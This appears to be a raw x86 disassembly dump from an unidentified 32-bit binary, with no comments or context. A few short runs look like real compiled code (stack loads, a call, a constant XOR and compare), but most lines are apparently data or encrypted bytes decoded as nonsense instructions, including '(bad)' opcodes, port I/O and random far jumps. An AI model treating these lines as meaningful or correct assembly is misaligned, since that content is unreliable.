  40b4c8:	and    esi,DWORD PTR ds:0x9553ae2
  40b4ce:	sbb    eax,0x8435bad9
  40b4d3:	xchg   esp,eax
  40b4d4:	xchg   ebp,eax
  40b4d5:	mov    DWORD PTR [ebp-0x2c],ecx
  40b4d8:	mov    eax,DWORD PTR [ebp-0x14]
  40b4db:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4de:	add    ecx,DWORD PTR [eax+0x1c]
  40b4e1:	xor    esi,esi
  40b4e3:	mov    DWORD PTR [ebp-0x14],ecx
  40b4e6:	mov    eax,DWORD PTR [ebp-0x28]
  40b4e9:	mov    ecx,DWORD PTR [ebp+0x8]
  40b4ec:	add    ecx,DWORD PTR [eax+edi*4]
  40b4ef:	lea    eax,[ebp-0x8]
  40b4f2:	mov    DWORD PTR [ebp-0x30],ecx
  40b4f5:	push   eax
  40b4f6:	jmp    0x40b759
  40b4fb:	pop    eax
  40b4fc:	pop    ds
  40b4fd:	sub    BYTE PTR [ebp+0x69],bl
  40b500:	imul   ebp,DWORD PTR [ecx+0x1b],0x5437698f
  40b507:	test   BYTE PTR [edi],dh
  40b509:	and    DWORD PTR [ebx+0x7e7ef0e8],ecx
  40b50f:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b513:	xchg   esp,eax
  40b514:	jge    0x40b4e9
  40b516:	mov    esi,0x8b3ccd77
  40b51b:	push   eax
  40b51c:	je     0x40b4b3
  40b51e:	addr16 inc ecx
  40b520:	mov    ds:0x24108b6,al
  40b525:	jle    0x40b554
  40b527:	mov    dl,0xa7
  40b529:	push   ebx
  40b52a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b52b:	test   al,0x80
  40b52d:	test   eax,0x93757bc1
  40b532:	js     0x40b53c
  40b534:	push   edi
  40b535:	mov    bl,0x38
  40b537:	mov    dh,0xa9
  40b539:	adc    al,0x3a
  40b53b:	leave  
  40b53c:	pop    eax
  40b53d:	call   0x1da41810
  40b542:	(bad)  [edx]
  40b544:	(bad)  
  40b545:	mov    al,0x32
  40b547:	call   0xf517:0xdcecb7dd
  40b54e:	jle    0x40b58f
  40b550:	in     al,0x21
  40b552:	xchg   esi,eax
  40b553:	test   DWORD PTR [eax+edi*2],0x9007ad8
  40b55a:	pop    ss
  40b55b:	clc    
  40b55c:	imul   edx,DWORD PTR [ebx+esi*1+0x7a62e07d],0x29
  40b564:	pop    DWORD PTR [edi]
  40b566:	xchg   esi,eax
  40b567:	jmp    0x3c83:0xb92af7a7
  40b56e:	and    al,0x90
  40b570:	push   esp
  40b571:	sbb    dh,BYTE PTR [eax+0x68dabb05]
  40b577:	gs data16 cld 
  40b57a:	lea    edx,[edi+0x68426023]
  40b580:	int    0xc6
  40b582:	add    ebx,DWORD PTR [eax]
  40b584:	mov    bl,0x2f
  40b586:	jg     0x40b537
  40b588:	addr16 je 0x40b588
  40b58b:	adc    BYTE PTR [ebp-0x7a],dh
  40b58e:	ja     0x40b57b
  40b590:	xchg   esi,eax
  40b591:	ds in  al,0xcd
  40b594:	rol    dh,1
  40b596:	in     al,dx
  40b597:	push   eax
  40b598:	cwde   
  40b599:	push   0xba1b08fd
  40b59e:	rcl    BYTE PTR [ecx],1
  40b5a0:	inc    ecx
  40b5a1:	ret    0xfe35
  40b5a4:	cmp    edi,esi
  40b5a6:	(bad)  
  40b5a7:	jbe    0x40b5ef
  40b5a9:	and    ebp,0x729695af
  40b5af:	aas    
  40b5b0:	push   ss
  40b5b1:	icebp  
  40b5b2:	sbb    DWORD PTR cs:[ebx+ebx*2],esp
  40b5b6:	push   0x1a
  40b5b8:	or     dl,cl
  40b5ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5bb:	icebp  
  40b5bc:	cli    
  40b5bd:	xor    BYTE PTR [esi+0x7bc61bc5],cl
  40b5c3:	stc    
  40b5c4:	xor    ecx,esp
  40b5c6:	jbe    0x40b636
  40b5c8:	in     eax,dx
  40b5c9:	mov    ebp,0x644e68ad
  40b5ce:	push   ss
  40b5cf:	enter  0x850,0x5c
  40b5d3:	mov    eax,0x7155bcbc
  40b5d8:	jmp    0xa556:0x5909814b
  40b5df:	jnp    0x40b563
  40b5e1:	and    cl,ch
  40b5e3:	sbb    eax,0x6451bc00
  40b5e8:	leave  
  40b5e9:	mov    al,0x5a
  40b5eb:	pop    edx
  40b5ec:	lods   al,BYTE PTR ds:[esi]
  40b5ed:	out    dx,eax
  40b5ee:	outs   dx,BYTE PTR ds:[esi]
  40b5ef:	ret    
  40b5f0:	push   cs
  40b5f1:	mov    ch,0xeb
  40b5f3:	jl     0x40b5cc
  40b5f5:	sbb    ebp,DWORD PTR [ebp+0x277ee2ec]
  40b5fb:	cmp    al,0x3a
  40b5fd:	(bad)  
  40b5fe:	xor    al,0x47
  40b600:	push   eax
  40b601:	mov    esp,0x2afe5116
  40b606:	mov    eax,ds:0x6622a09b
  40b60b:	pop    edi
  40b60c:	adc    ebp,esi
  40b60e:	sahf   
  40b60f:	mov    esi,0x32be89e5
  40b614:	icebp  
  40b615:	or     ah,BYTE PTR [edi+0xa]
  40b618:	std    
  40b619:	sbb    BYTE PTR [eax-0x7a1fc29],ch
  40b61f:	ror    ecx,1
  40b621:	mul    DWORD PTR [esi]
  40b623:	xor    al,0x89
  40b625:	mov    ds:0x36ce32cd,eax
  40b62a:	mov    cl,0xd4
  40b62c:	pop    ss
  40b62d:	loope  0x40b678
  40b62f:	mov    bl,0x4d
  40b631:	fisub  WORD PTR [eax-0x19674232]
  40b637:	push   ecx
  40b638:	sti    
  40b639:	sub    DWORD PTR [esi-0x536ea26d],0xc1aaa579
  40b643:	jbe    0x40b64c
  40b645:	enter  0x3f97,0x6d
  40b649:	nop
  40b64a:	xor    al,0xef
  40b64c:	xor    DWORD PTR [edx+0x16],ebx
  40b64f:	jl     0x40b6ae
  40b651:	sbb    ch,BYTE PTR [ecx-0x6f]
  40b654:	test   al,0xcd
  40b656:	sub    cl,BYTE PTR [esi+eiz*2]
  40b659:	pop    ss
  40b65a:	jmp    0x40b6b8
  40b65c:	fiadd  DWORD PTR ds:0xb0b309e1
  40b662:	push   eax
  40b663:	pop    sp
  40b665:	and    edx,DWORD PTR [edi]
  40b667:	lods   al,BYTE PTR ds:[esi]
  40b668:	lahf   
  40b669:	call   0xe20f:0x4bec54aa
  40b670:	scas   eax,DWORD PTR es:[edi]
  40b671:	mov    ebx,fs
  40b673:	(bad)  
  40b675:	call   0x1c96:0x9be18a87
  40b67c:	sbb    bl,bl
  40b67e:	cmp    esp,DWORD PTR [esp+eax*2+0xc]
  40b682:	jecxz  0x40b663
  40b684:	in     al,dx
  40b685:	mov    ecx,0x22a6b0ca
  40b68a:	stos   DWORD PTR es:[edi],eax
  40b68b:	push   0x8c6643e7
  40b690:	push   es
  40b691:	mov    dl,0xba
  40b693:	shr    DWORD PTR [edx],0x8d
  40b696:	sub    cl,ah
  40b698:	push   edx
  40b699:	imul   ebp,DWORD PTR [ecx+0x1e],0x1a
  40b69d:	jg     0x40b6aa
  40b69f:	rcr    al,cl
  40b6a1:	xor    cl,BYTE PTR [esi]
  40b6a3:	jbe    0x40b692
  40b6a5:	ja     0x40b64e
  40b6a7:	fs popf 
  40b6a9:	test   eax,0xa7151f42
  40b6ae:	add    BYTE PTR [eax+ecx*8-0x59],cl
  40b6b2:	loopne 0x40b646
  40b6b4:	or     DWORD PTR [ecx],0x3f
  40b6b7:	je     0x40b687
  40b6b9:	inc    ecx
  40b6ba:	lea    esi,[eax-0x3c]
  40b6bd:	adc    BYTE PTR [esi],ch
  40b6bf:	sti    
  40b6c0:	mov    bh,0x1f
  40b6c2:	or     eax,0x803e4b19
  40b6c7:	pop    ss
  40b6c8:	xchg   esp,eax
  40b6c9:	adc    al,0x4f
  40b6cb:	hlt    
  40b6cc:	mov    bl,ch
  40b6ce:	inc    ecx
  40b6cf:	pop    edx
  40b6d0:	cdq    
  40b6d1:	inc    esi
  40b6d2:	pusha  
  40b6d3:	or     BYTE PTR [edi-0xc474cfe],bh
  40b6d9:	sbb    dl,dl
  40b6db:	test   al,0x8a
  40b6dd:	pusha  
  40b6de:	and    esp,DWORD PTR [ebp-0xf]
  40b6e1:	push   esp
  40b6e2:	pop    esp
  40b6e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6e4:	push   ss
  40b6e5:	dec    edx
  40b6e6:	leave  
  40b6e7:	in     al,dx
  40b6e8:	sbb    DWORD PTR ds:0x67890364,ebp
  40b6ee:	mov    ah,0xc9
  40b6f0:	in     al,dx
  40b6f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6f2:	mov    eax,0xb1ad79ff
  40b6f7:	fwait
  40b6f8:	pop    edi
  40b6f9:	mov    ds:0x8ecd6d23,al
  40b6fe:	xchg   edi,eax
  40b6ff:	mov    ch,0x69
  40b701:	adc    DWORD PTR [ebp+0xa],0x8a64f2a4
  40b708:	push   esp
  40b709:	icebp  
  40b70a:	dec    eax
  40b70b:	adc    dh,cl
  40b70d:	fdivr  QWORD PTR [esp+ecx*8+0x360638d7]
  40b714:	(bad)  
  40b715:	addr16 jns 0x40b77e
  40b718:	test   eax,0x8846c74b
  40b71d:	push   ebp
  40b71e:	or     eax,0x3df9d682
  40b723:	or     DWORD PTR [edi],edi
  40b725:	fwait
  40b726:	lds    esi,FWORD PTR [ecx+0x5b]
  40b729:	adc    eax,0x4e24b7ca
  40b72e:	int    0xa2
  40b730:	in     eax,0x3
  40b732:	test   BYTE PTR [ecx-0xe39269f],bh
  40b738:	add    al,0xdc
  40b73a:	mov    BYTE PTR [esi-0x2a],cl
  40b73d:	xor    edi,esi
  40b73f:	aas    
  40b740:	lods   al,BYTE PTR ds:[esi]
  40b741:	mov    ch,0xe6
  40b743:	jl     0x40b762
  40b745:	cmp    bl,BYTE PTR [esp+eiz*4-0x44]
  40b749:	or     al,0x7d
  40b74b:	popf   
  40b74c:	sub    DWORD PTR [edi-0x5b1e58e9],edx
  40b752:	pop    ds
  40b753:	cdq    
  40b754:	or     BYTE PTR [ebp-0x7d],0xed
  40b758:	mov    bl,0xff
  40b75a:	jne    0x40b72c
  40b75c:	push   DWORD PTR [ebp+0xc]
  40b75f:	call   0x410212
  40b764:	mov    eax,DWORD PTR [ebp-0x4]
  40b767:	mov    ecx,DWORD PTR [ebp-0x8]
  40b76a:	xor    eax,0x7510854
  40b76f:	add    eax,ebx
  40b771:	cmp    ecx,eax
  40b773:	jne    0x40b9f9
  40b779:	jmp    0x40b9dc
  40b77e:	mov    edi,0x716ef17f
  40b783:	jo     0x40b7c6
  40b785:	das    
  40b786:	pushf  
  40b787:	dec    edi
  40b788:	je     0x40b75f
  40b78a:	les    ebx,FWORD PTR [edi-0x14dd108]
  40b790:	jle    0x40b810
  40b792:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40b796:	loopne 0x40b7cb
  40b798:	cdq    
  40b799:	push   esp
  40b79a:	aas    
  40b79b:	cmp    DWORD PTR [edi-0x15],edi
  40b79e:	xor    ah,BYTE PTR [eax]
  40b7a0:	sub    BYTE PTR ds:0x7f43e11f,bh
  40b7a6:	sar    cl,0xf6
  40b7a9:	add    BYTE PTR [edi-0x428b41ca],al
  40b7af:	pop    ss
  40b7b0:	(bad)
  40b7b3:	sbb    al,0x51
  40b7b5:	inc    ecx
  40b7b6:	repz inc edi
  40b7b8:	pop    ebx
  40b7b9:	sub    ebp,ebx
  40b7bb:	cli    
  40b7bc:	push   eax
  40b7bd:	fist   WORD PTR [esi-0x4111e5b]
  40b7c3:	dec    ecx
  40b7c4:	mov    esp,DWORD PTR [edx]
  40b7c6:	(bad)  
  40b7c7:	sub    edi,DWORD PTR [eax+0x7e693ce5]
  40b7cd:	(bad)  
  40b7ce:	mov    bl,0x8a
  40b7d0:	push   edi
  40b7d1:	int    0x2f
  40b7d3:	repnz inc edx
  40b7d5:	popa   
  40b7d6:	mov    edx,0x56153625
  40b7db:	pop    ebx
  40b7dc:	jge    0x40b847
  40b7de:	pop    edx
  40b7e0:	out    dx,eax
  40b7e1:	(bad)  
  40b7e2:	in     al,dx
  40b7e3:	dec    ebp
  40b7e4:	dec    ebp
  40b7e5:	idiv   DWORD PTR [edi-0x74]
  40b7e8:	xor    al,0x53
  40b7ea:	out    dx,al
  40b7eb:	cmp    ch,BYTE PTR ds:0x2504b9b8
  40b7f1:	dec    eax
  40b7f2:	cmp    al,0x95
  40b7f4:	cdq    
  40b7f5:	mov    dh,0x4f
  40b7f7:	test   DWORD PTR [ebp-0x3b3e9104],ecx
  40b7fd:	fwait
  40b7fe:	iret   
  40b7ff:	adc    ebx,0x8bb5c703
  40b805:	rcr    DWORD PTR [ebx-0x1b3d30c1],cl
  40b80b:	adc    ecx,esp
  40b80d:	adc    al,0x1e
  40b80f:	shr    BYTE PTR [ebp-0x3b],1
  40b812:	sbb    eax,DWORD PTR [eax-0x57]
  40b815:	inc    ebp
  40b816:	jnp    0x40b855
  40b818:	sbb    edi,DWORD PTR [edx-0x24]
  40b81b:	fsubr  st,st(5)
  40b81d:	(bad)  
  40b81f:	call   0xc35a8d5d
  40b824:	and    cl,bl
  40b826:	pop    ds
  40b827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b828:	dec    edi
  40b829:	ret    0xd653
  40b82c:	loope  0x40b84c
  40b82e:	(bad)  
  40b82f:	call   0x6f67bfa5
  40b834:	sahf   
  40b835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b836:	rol    bh,1
  40b838:	push   edi
  40b839:	hlt    
  40b83a:	test   DWORD PTR [edx-0x5b],edi
  40b83d:	inc    edx
  40b83e:	cmp    ecx,ecx
  40b840:	xor    ah,ch
  40b842:	mov    al,0xe9
  40b844:	adc    al,0xd5
  40b846:	(bad)  
  40b847:	jns    0x40b85a
  40b849:	int3   
  40b84a:	pop    ss
  40b84b:	mov    DWORD PTR [ecx],esi
  40b84d:	jmp    0x6040435c
  40b852:	sbb    bh,BYTE PTR [esi-0x15]
  40b855:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b856:	add    eax,0xe6a5e10c
  40b85b:	outs   dx,BYTE PTR ds:[esi]
  40b85c:	scas   eax,DWORD PTR es:[edi]
  40b85d:	in     al,0x1e
  40b85f:	bound  eax,QWORD PTR [eax+0x54]
  40b862:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b863:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b864:	mov    ebx,0x70e7c51d
  40b869:	shl    esp,1
  40b86b:	push   edi
  40b86c:	jecxz  0x40b8da
  40b86e:	xor    eax,0x9838be8a
  40b873:	or     DWORD PTR [ecx+0x7238f890],ebx
  40b879:	sbb    eax,ebp
  40b87b:	jb     0x40b8f6
  40b87d:	jns    0x40b872
  40b87f:	cli    
  40b880:	sub    ah,BYTE PTR [edx+0x746f837c]
  40b886:	loope  0x40b848
  40b888:	push   es
  40b889:	sub    ecx,DWORD PTR [eax]
  40b88b:	fsubr  DWORD PTR [edx]
  40b88d:	mov    esp,0xfb7d7921
  40b892:	xor    BYTE PTR [ecx-0x57c6df6f],0xbd
  40b899:	jp     0x40b886
  40b89b:	retf   
  40b89c:	sahf   
  40b89d:	js     0x40b87c
  40b89f:	mov    ds:0xc8b845a7,eax
  40b8a4:	xor    eax,0x9ce60c59
  40b8a9:	fiadd  WORD PTR ds:0xdf62f693
  40b8af:	cdq    
  40b8b0:	pop    ds
  40b8b1:	aas    
  40b8b2:	jns    0x40b871
  40b8b4:	ss sbb al,0x4
  40b8b7:	jecxz  0x40b8da
  40b8b9:	aad    0x83
  40b8bb:	mov    WORD PTR [ebx-0x3f],es
  40b8be:	test   BYTE PTR [eax+eax*2+0x62],dl
  40b8c2:	pop    ecx
  40b8c3:	dec    esi
  40b8c4:	sbb    ebx,0x75
  40b8c7:	lods   al,BYTE PTR ds:[esi]
  40b8c8:	mov    ds:0x7bfd5101,eax
  40b8cd:	push   0x59cd9418
  40b8d2:	mov    edx,0x8e7c6f6d
  40b8d7:	xor    BYTE PTR [eax],bh
  40b8d9:	out    dx,al
  40b8da:	sub    DWORD PTR [ebp-0xb80be00],ebx
  40b8e0:	call   0x263d261b
  40b8e5:	lds    ebp,FWORD PTR [eax+0x18]
  40b8e8:	jns    0x40b8b2
  40b8ea:	loop   0x40b8a8
  40b8ec:	inc    ecx
  40b8ed:	test   BYTE PTR [edx],dh
  40b8ef:	gs xor al,0xd0
  40b8f2:	ins    DWORD PTR es:[edi],dx
  40b8f3:	add    al,0xfc
  40b8f5:	sub    eax,0x962f9045
  40b8fa:	mov    al,0xc8
  40b8fc:	ins    DWORD PTR es:[edi],dx
  40b8fd:	retf   0xc9
  40b900:	or     eax,0x41d0660a
  40b905:	repnz add BYTE PTR [edx+ecx*4-0x781f3ad3],0xcb
  40b90e:	inc    ecx
  40b90f:	inc    ebx
  40b910:	jg     0x40b97a
  40b912:	add    ebx,DWORD PTR ds:0xc1db42f9
  40b918:	sbb    esi,DWORD PTR [eax-0x69]
  40b91b:	iret   
  40b91c:	jle    0x40b942
  40b91e:	dec    esi
  40b91f:	mov    al,ds:0xa730cfd7
  40b924:	je     0x40b8d7
  40b926:	sar    BYTE PTR [eax-0x2b3eb452],cl
  40b92c:	out    0xb2,al
  40b92e:	cmc    
  40b92f:	scas   eax,DWORD PTR es:[edi]
  40b930:	iret   
  40b931:	dec    edx
  40b932:	fmul   DWORD PTR [ecx+0x53]
  40b935:	retf   0x28bc
  40b938:	lea    esp,[edi-0x3c]
  40b93b:	xchg   ebx,eax
  40b93c:	je     0x40b902
  40b93e:	cld    
  40b93f:	dec    ebp
  40b940:	pop    ds
  40b941:	sbb    DWORD PTR [edi+0x2f],0xe99b0bbb
  40b948:	inc    esi
  40b949:	xchg   BYTE PTR [ebx],cl
  40b94b:	aam    0x75
  40b94d:	inc    esp
  40b94e:	leave  
  40b94f:	dec    ebp
  40b950:	mov    eax,0x34811c67
  40b955:	pop    esi
  40b956:	xor    ecx,DWORD PTR [ebx+0x2d]
  40b959:	dec    ecx
  40b95a:	ins    BYTE PTR es:[edi],dx
  40b95b:	inc    esp
  40b95c:	sar    DWORD PTR [edi-0x50],1
  40b95f:	in     al,dx
  40b960:	push   eax
  40b961:	out    dx,eax
  40b962:	adc    DWORD PTR [edi+eax*8-0x70e55784],ecx
  40b969:	push   eax
  40b96a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b96b:	je     0x40b96d
  40b96d:	xchg   esp,eax
  40b96e:	neg    dl
  40b970:	xor    eax,0x354e18b9
  40b975:	push   ebx
  40b976:	add    eax,0xd2308f6
  40b97b:	add    BYTE PTR [ebp+0x44],bh
  40b97e:	inc    ecx
  40b97f:	push   esp
  40b980:	pop    ds
  40b981:	out    dx,eax
  40b982:	out    0x5a,al
  40b984:	clc    
  40b985:	in     al,dx
  40b986:	fadd   DWORD PTR [eax]
  40b988:	jp     0x40b9c0
  40b98a:	(bad)  
  40b98b:	mov    dl,0x82
  40b98d:	dec    edx
  40b98e:	daa    
  40b98f:	pop    ds
  40b990:	push   ebp
  40b991:	push   ecx
  40b992:	pop    es
  40b993:	ss repnz int3 
  40b996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b997:	pop    edx
  40b998:	mov    dh,0xab
  40b99a:	xor    BYTE PTR ds:0xf1bdbbb7,dl
  40b9a0:	in     eax,0xa3
  40b9a2:	ret    
  40b9a3:	pop    es
  40b9a4:	aaa    
  40b9a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9a6:	and    DWORD PTR [ebp+0x3e3eb86c],0x7fb8e20d
  40b9b0:	or     bh,bl
  40b9b2:	add    eax,0xeb181d2e
  40b9b7:	xchg   DWORD PTR [edi],eax
  40b9b9:	pop    edi
  40b9ba:	inc    esp
  40b9bb:	shl    DWORD PTR [edi],cl
  40b9bd:	add    BYTE PTR [ebx+0x2f],al
  40b9c0:	or     DWORD PTR [esi+edx*8],ebp
  40b9c3:	pop    ebx
  40b9c4:	hlt    
  40b9c5:	sbb    ebp,DWORD PTR [esi-0x16]
  40b9c8:	in     eax,dx
  40b9c9:	jle    0x40ba02
  40b9cb:	adc    BYTE PTR [ebp+0x59251b4b],cl
  40b9d1:	(bad)  
  40b9d2:	fdiv   st(7),st
  40b9d4:	fcomp  QWORD PTR [ebx]
  40b9d6:	or     DWORD PTR [ebx+0x2a],esp
  40b9d9:	sbb    DWORD PTR [edi-0x54],esi
  40b9dc:	mov    eax,DWORD PTR [ebp-0x20]
  40b9df:	inc    edi
  40b9e0:	cmp    edi,eax
  40b9e2:	jb     0x40a46c
  40b9e8:	jmp    0x40bc6c
  40b9ed:	mov    eax,DWORD PTR [ebp-0x4]
  40b9f0:	xor    eax,esi
  40b9f2:	add    eax,ebx
  40b9f4:	jmp    0x40d598
  40b9f9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b9fc:	jmp    0x40bc5f
  40ba01:	test   BYTE PTR [ecx],ch
  40ba03:	popa   
  40ba04:	lahf   
  40ba05:	jno    0x40ba7e
  40ba07:	inc    eax
  40ba08:	xor    DWORD PTR [edi+ebp*8+0x3529a808],eax
  40ba0f:	cli    
  40ba10:	add    al,0x7c
  40ba12:	std    
  40ba13:	jle    0x40ba93
  40ba15:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40ba19:	(bad)
  40ba1d:	mov    ebx,0x79dc04f7
  40ba22:	not    al
  40ba24:	sahf   
  40ba25:	jg     0x40ba86
  40ba27:	dec    esp
  40ba28:	lock stc 
  40ba2a:	add    eax,0x81749449
  40ba2f:	sar    bh,0x4f
  40ba32:	xor    al,BYTE PTR [ebx+0x3]
  40ba35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba36:	jno    0x40ba6d
  40ba38:	adc    al,0x70
  40ba3a:	les    esi,FWORD PTR gs:[eax+0x622e6521]
  40ba41:	loope  0x40ba31
  40ba43:	call   0xaeb3:0xef8ce224
  40ba4a:	test   al,0xd4
  40ba4c:	mov    eax,ds:0x4f1e7dd5
  40ba51:	and    al,0x4b
  40ba53:	jmp    0x8bd5:0xd2b83929
  40ba5a:	and    ebp,DWORD PTR [esi+0x65ccf970]
  40ba60:	push   ebx
  40ba61:	out    dx,eax
  40ba62:	add    BYTE PTR ds:0x212eb52f,dh
  40ba68:	fidiv  WORD PTR [esi+0x2910caeb]
  40ba6e:	xor    al,0x7e
  40ba70:	jg     0x40ba4d
  40ba72:	mov    bh,0x48
  40ba74:	imul   edx,ebx,0xffffffac
  40ba77:	mov    bh,0x7f
  40ba79:	call   0x6debc606
  40ba7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba7f:	rcl    edx,0xae
  40ba82:	pop    esi
  40ba83:	lods   al,BYTE PTR ds:[esi]
  40ba84:	adc    al,BYTE PTR [edx]
  40ba86:	lds    edi,FWORD PTR [ebx+ebx*1-0x3e1fb24c]
  40ba8d:	sbb    edi,esi
  40ba8f:	jg     0x40bb0a
  40ba91:	mov    BYTE PTR [edx-0x59],ah
  40ba94:	inc    BYTE PTR [ebx]
  40ba96:	jp     0x40ba7c
  40ba98:	xor    edx,esi
  40ba9a:	out    dx,al
  40ba9b:	int    0xa
  40ba9d:	out    dx,eax
  40ba9e:	(bad)  
  40ba9f:	in     al,0xe9
  40baa1:	ins    DWORD PTR es:[edi],dx
  40baa2:	sub    bh,dl
  40baa4:	or     eax,0x53d676ed
  40baa9:	imul   edi,DWORD PTR [edi],0x8ec88c0b
  40baaf:	mov    al,ds:0xd55e64bc
  40bab4:	pop    esi
  40bab5:	xchg   ebp,eax
  40bab6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bab7:	cmp    ebp,DWORD PTR [eax]
  40bab9:	lods   eax,DWORD PTR ds:[esi]
  40baba:	scas   eax,DWORD PTR es:[edi]
  40babb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40babc:	sbb    eax,0x9b049a68
  40bac1:	cmp    eax,0x157a01a0
  40bac6:	enter  0x9760,0x58
  40baca:	mov    eax,0xf677ffb9
  40bacf:	sbb    ch,BYTE PTR [ebp-0x1f]
  40bad2:	dec    ecx
  40bad3:	retf   
  40bad4:	push   ds
  40bad5:	fsubr  st,st(2)
  40bad7:	dec    edx
  40bad8:	push   ecx
  40bad9:	cld    
  40bada:	daa    
  40badb:	push   eax
  40badc:	add    ecx,DWORD PTR ds:0xc31bb5ea
  40bae2:	stos   BYTE PTR es:[edi],al
  40bae3:	mov    al,BYTE PTR [edx+0x7277dd0f]
  40bae9:	rcr    DWORD PTR [edi+0x44897fd9],0x9a
  40baf0:	fdivr  QWORD PTR [ebp-0x45f1fc41]
  40baf6:	push   ecx
  40baf7:	data16 mov gs,WORD PTR [esi-0x533da495]
  40bafe:	fdivr  QWORD PTR [ecx-0x41]
  40bb01:	sub    BYTE PTR [ebp+edi*4+0x225a606c],cl
  40bb08:	(bad)  
  40bb09:	out    dx,al
  40bb0a:	sub    edx,DWORD PTR [edx+0x6d3cdbde]
  40bb10:	dec    ebx
  40bb11:	inc    ebx
  40bb12:	jg     0x40bb26
  40bb14:	inc    esp
  40bb15:	or     BYTE PTR [eax-0x7c],cl
  40bb18:	test   al,0x48
  40bb1a:	mov    edi,0x8a0188dc
  40bb1f:	jge    0x40bb0c
  40bb21:	mov    cl,0xdf
  40bb23:	shl    BYTE PTR [esi+0x10],cl
  40bb26:	push   0xc2096f45
  40bb2b:	sbb    BYTE PTR [eax-0x117542e8],ch
  40bb31:	in     al,dx
  40bb32:	jmp    0x40bb6e
  40bb34:	push   esp
  40bb35:	in     al,0xf2
  40bb37:	inc    edi
  40bb38:	fild   QWORD PTR [edx-0x6d]
  40bb3b:	push   ds
  40bb3c:	fs nop
  40bb3e:	jge    0x40bb2c
  40bb40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb41:	cmp    esp,ecx
  40bb43:	bound  ebx,QWORD PTR [edi+ecx*1]
  40bb46:	jmp    0x6310:0xf03a1ced
  40bb4d:	(bad)  
  40bb4f:	retf   
  40bb50:	mov    ebp,0xd17d18a6
  40bb55:	rol    BYTE PTR [esi+0x2e],0x4
  40bb59:	mov    al,ds:0xd3ace4bc
  40bb5e:	xor    bh,BYTE PTR [edi]
  40bb60:	jmp    0x8081651b
  40bb65:	mov    al,ds:0x10892745
  40bb6a:	mov    edx,0x5d50b9bd
  40bb6f:	std    
  40bb70:	retf   
  40bb71:	cmp    eax,0x30b78b49
  40bb76:	fwait
  40bb77:	xchg   edx,eax
  40bb78:	fs (bad) 
  40bb7a:	stc    
  40bb7b:	cmp    al,0xcb
  40bb7d:	cwde   
  40bb7e:	pop    ebp
  40bb7f:	jae    0x40bbf9
  40bb81:	and    cl,bh
  40bb83:	fs aam 0x2e
  40bb86:	leave  
  40bb87:	pushf  
  40bb88:	jae    0x40bbb8
  40bb8a:	js     0x40bb52
  40bb8c:	out    dx,al
  40bb8d:	sbb    BYTE PTR [eax+0x18],dh
  40bb90:	xchg   edx,eax
  40bb91:	add    BYTE PTR [ecx+ecx*1-0x80],dh
  40bb95:	adc    eax,0x87ca3b01
  40bb9a:	add    eax,0x53b6859f
  40bb9f:	cmp    dl,BYTE PTR [ebx-0xcdf75b1]
  40bba5:	adc    ch,BYTE PTR [eax-0x4946145b]
  40bbab:	inc    edx
  40bbac:	cmp    DWORD PTR [esi+edi*4+0x3d],esi
  40bbb0:	push   ss
  40bbb1:	xchg   esi,eax
  40bbb2:	call   0x495e:0x29af9446
  40bbb9:	loop   0x40bb3e
  40bbbb:	js     0x40bb62
  40bbbd:	icebp  
  40bbbe:	call   0x1d2f0d8d
  40bbc3:	mov    esi,0xd9fce72
  40bbc8:	cld    
  40bbc9:	test   eax,0x51c79d3c
  40bbce:	or     DWORD PTR ds:0xe8544cc1,edi
  40bbd4:	daa    
  40bbd5:	rol    BYTE PTR [edi],cl
  40bbd7:	ins    BYTE PTR es:[edi],dx
  40bbd8:	fidiv  DWORD PTR [edx-0x53]
  40bbdb:	rol    DWORD PTR [edx-0x7f],0x38
  40bbdf:	mov    edx,0xa3177097
  40bbe4:	xchg   ebx,eax
  40bbe5:	xchg   edx,eax
  40bbe6:	adc    al,0x88
  40bbe8:	fnsave [ecx+0x8bea575]
  40bbee:	retf   0x1428
  40bbf1:	pop    ebx
  40bbf2:	retf   0xe19f
  40bbf5:	mov    ch,0xa5
  40bbf7:	xor    ch,BYTE PTR [ecx]
  40bbf9:	push   es
  40bbfa:	xchg   edx,eax
  40bbfb:	callw  0xb8dd
  40bbff:	icebp  
  40bc00:	addr16 mov cl,0xd7
  40bc03:	push   ss
  40bc04:	(bad)  
  40bc05:	daa    
  40bc06:	pusha  
  40bc07:	int    0x49
  40bc09:	retf   
  40bc0a:	adc    BYTE PTR [esi-0x4e4880c1],bl
  40bc10:	inc    ebx
  40bc11:	adc    eax,esp
  40bc13:	jle    0x40bc78
  40bc15:	dec    edx
  40bc16:	xchg   edi,eax
  40bc17:	jno    0x40bc60
  40bc19:	in     al,dx
  40bc1a:	pop    ecx
  40bc1b:	addr16 push edx
  40bc1d:	adc    BYTE PTR [edi],al
  40bc1f:	cmp    al,0x1c
  40bc21:	outs   dx,DWORD PTR ds:[esi]
  40bc22:	lods   eax,DWORD PTR ds:[esi]
  40bc23:	stos   DWORD PTR es:[edi],eax
  40bc24:	ret    0xd36c
  40bc27:	xchg   edi,eax
  40bc28:	push   cs
  40bc29:	(bad)  
  40bc2a:	(bad)  [ecx]
  40bc2c:	(bad)  
  40bc2d:	mov    ah,0x15
  40bc2f:	pusha  
  40bc30:	fadd   DWORD PTR [ebp+0x608997cc]
